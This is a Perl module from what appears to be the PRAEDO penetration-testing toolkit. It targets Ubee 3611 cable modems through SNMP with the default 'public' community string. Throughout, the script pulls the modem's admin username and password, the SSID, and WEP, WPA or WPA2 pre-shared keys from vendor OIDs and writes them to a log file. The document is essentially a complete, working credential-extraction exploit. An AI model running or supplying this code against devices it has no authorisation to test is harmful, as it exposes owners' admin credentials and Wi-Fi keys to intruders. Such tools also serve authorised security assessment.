# Ubee 3611 modem SNMP data extract  
# 
######################################################
#                  PRAEDO Module #MA0022             #
#          Copyright (C) 2014 	 layereddefense.com  #
#              Deral Heiland    "@percent_x"         # 
######################################################
package MA0022;
sub MA0022
{
 
# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Open output file and setup browser LWP function 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
print "\n**********Attempting to extract wifi settings via snmp from $TARGET : JOB MA0022**********\n";


# setup SNMP session
($session,$error) = Net::SNMP->session(Hostname => $TARGET, Community => public);

$uname = $session->get_request("1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0");
$passw = $session->get_request("1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0");
print OUTFILE "USERNAME= ".$uname->{"1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0"}."  :  ";
print OUTFILE "PASSWORD = ".$passw->{"1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0"}."\n";




# Test device for wifi security type enabled
$result = $session->get_request("1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.5.12");
my $wifisec = $result->{"1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.5.12"};

#extract SSID name
$ssidname = $session->get_request("1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.3.12");
print OUTFILE "SSID: ".$ssidname->{"1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.3.12"}."\n";

# pull wifi security keys based on device setup
        if ($wifisec == 0)
            {
            print "SUCCESS\n";
            print OUTFILE "Device is configured with OPEN access wifi\n";
            }

        elsif ($wifisec == 1)
            {
             print "SUCCESS\n";
 	     print OUTFILE "Device is configured for WEP \n";
            # extract WEP KEY info
                my $wepkey1 = $session->get_request("1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.1");
                my $wepkey2 = $session->get_request("1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.2");
                my $wepkey3 = $session->get_request("1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.3");
                my $wepkey4 = $session->get_request("1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.4");
                my $actkey = $session->get_request("1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12");
                print OUTFILE "WEP kEY1: ".$wepkey1->{"1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.1"}."\n";
                print OUTFILE "WEP kEY2: ".$wepkey2->{"1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.2"}."\n";
                print OUTFILE "WEP kEY3: ".$wepkey3->{"1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.3"}."\n";
                print OUTFILE "WEP kEY4: ".$wepkey4->{"1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.4"}."\n";
                print OUTFILE "The current active key is: ".$actkey->{"1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12"}."\n";

            }
        elsif ($wifisec == 2)
            {
            print "SUCCESS\n"; 
            print OUTFILE "Device is configured for WPA PSK \n";
            # extract WPA PSK info
                my $wpakey = $session->get_request("1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12");
                print OUTFILE "WPA PSK: ".$wpakey->{"1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12"}."\n";
            }
	elsif ($wifisec == 3)
            {
	    print "SUCCESS\n";
            print OUTFILE "Device is configured for WPA2 PSK\n";
	    # extract WPA2 PSK info
		my $wpa2psk = $session->get_request("1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12");
		print OUTFILE "WPA2 PSK: ".$wpa2psk->{"1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12"}."\n";

            }
        elsif ($wifisec == 4)
            {
            print "SUCCESS\n";
            print OUTFILE "Device is configured for WPA Enterprise no usable wifi data extracted\n";
            }

            elsif ($wifisec == 5)
            {
            print "SUCCESS\n";
            print OUTFILE "Device is configured for WPA2 Enterprise no usable wifi data extracted\n";
            } 

        elsif ($wifisec == 6)
            {
	    print "SUCCESS\n"; 
            print OUTFILE "Device is configured for WEP 802.1x no usable wifi data extracted\n";
            }

        else
           {
           print "FAILED\n";
           print OUTFILE "FAILED\n";
	   }





# operation completed close out output files and snmp sessions
$session->close;
close(OUTFILE);

}
1;
